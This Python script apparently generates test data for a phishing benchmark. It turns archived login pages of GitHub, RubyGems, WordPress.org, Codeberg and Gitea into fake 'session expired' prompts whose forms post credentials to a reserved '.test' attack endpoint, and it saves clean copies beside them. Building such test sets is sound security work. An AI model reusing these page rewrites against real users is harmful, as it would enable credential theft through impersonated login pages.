#!/usr/bin/env python3
"""Build full-page session-expiry replacements from two archived HTML responses."""

from __future__ import annotations

import hashlib
import json
from pathlib import Path
import re
import sys


ROOT = Path(__file__).resolve().parents[1]


def replacements_for(spec: dict) -> list[dict]:
    endpoint = spec["attack_endpoint"]
    kind = spec["login_kind"]
    profiles = {
        "github": [
            ('"title":"Sign in to GitHub"', '"title":"Your session expired. Sign in to GitHub"', 1),
            ('>Sign in to GitHub</h1>', '>Your session expired. Sign in to GitHub</h1>', 1),
            ('<form data-turbo="false" action="/session"',
             f'<form data-turbo="false" action="{endpoint}"', 1),
        ],
        "rubygems": [
            ('>Sign in</h1>', '>Session expired. Sign in</h1>', 1),
            ('<form action="/session" accept-charset="UTF-8" method="post">',
             f'<form action="{endpoint}" accept-charset="UTF-8" method="post">', 1),
        ],
        "wordpress": [
            ('<p class="intro">Log in to your WordPress.org account',
             '<p class="intro">Your session has expired. Log in to your WordPress.org account', 1),
            ('action="https://login.wordpress.org/wp-login.php" method="post"',
             f'action="{endpoint}" method="post"', 1),
        ],
        "codeberg": [
            ('\t\t\tSign in\n\t\t\n\t</h4>',
             '\t\t\tSession expired. Sign in\n\t\t\n\t</h4>', 1),
            ('<form class="ui form tw-mb-4" action="/user/login" method="post">',
             f'<form class="ui form tw-mb-4" action="{endpoint}" method="post">', 1),
        ],
        "gitea": [
            ('\t\t\tSign In\n\t\t\n\t</h4>',
             '\t\t\tSession expired. Sign In\n\t\t\n\t</h4>', 1),
            ('<form class="ui form" action="/user/login" method="post">',
             f'<form class="ui form" action="{endpoint}" method="post">', 1),
        ],
    }
    return [{"old": old, "new": new, "count": count} for old, new, count in profiles[kind]]


def with_base(html: str, url: str) -> str:
    head = re.search(r"<head\b[^>]*>", html, flags=re.I)
    if head is None or "</html>" not in html.lower():
        raise ValueError(f"Incomplete HTML response from {url}")
    return html[:head.end()] + f'\n<base href="{url}">' + html[head.end():]


def build(spec_path: Path) -> None:
    spec = json.loads(spec_path.read_text(encoding="utf-8"))
    case_id = spec_path.parent.name
    clean_bytes = (spec_path.parent / "target_original.html").read_bytes()
    login_bytes = (spec_path.parent / "login_original.html").read_bytes()
    clean = with_base(clean_bytes.decode("utf-8-sig"), spec["source_url"])
    attack = with_base(login_bytes.decode("utf-8-sig"), spec["login_source_url"])
    if spec["login_kind"] in {"codeberg", "gitea"}:
        attack = attack.replace(
            "</head>",
            '<meta http-equiv="Content-Security-Policy" content="script-src \'none\'">\n</head>',
            1,
        )
    for replacement in replacements_for(spec):
        old, new, count = replacement["old"], replacement["new"], replacement["count"]
        if not old or attack.count(old) != count:
            raise ValueError(f"Unexpected login anchor in {case_id}: {old[:100]}")
        attack = attack.replace(old, new)
    if ".test/" not in attack:
        raise ValueError(f"Missing reserved local test endpoint: {case_id}")
    for mode, html in (("clean", clean), ("attack", attack)):
        target = ROOT / f"new_data/{mode}_assets/{case_id}/page.html"
        target.parent.mkdir(parents=True, exist_ok=True)
        target.write_text(html, encoding="utf-8")
    (spec_path.parent / "SOURCE.md").write_text(
        f'Target page: {spec["source_url"]}\n'
        f'Login page: {spec["login_source_url"]}\n'
        f'Captured: {spec["captured"]} (direct HTTP HTML responses)\n'
        f'Target SHA-256: {hashlib.sha256(clean_bytes).hexdigest()}\n'
        f'Login SHA-256: {hashlib.sha256(login_bytes).hexdigest()}\n'
        "Clean adds a base URL to target HTML. Attack replaces the entire page with "
        "login HTML, adding a session-expiry notice and a reserved .test submit target. "
        "Forgejo/Gitea scripts are disabled in the attack preview to prevent a "
        "preview-origin ROOT_URL warning.\n",
        encoding="utf-8",
    )


def main() -> None:
    for arg in sys.argv[1:]:
        path = Path(arg)
        build(path)
        print(path.parent.name)


if __name__ == "__main__":
    main()
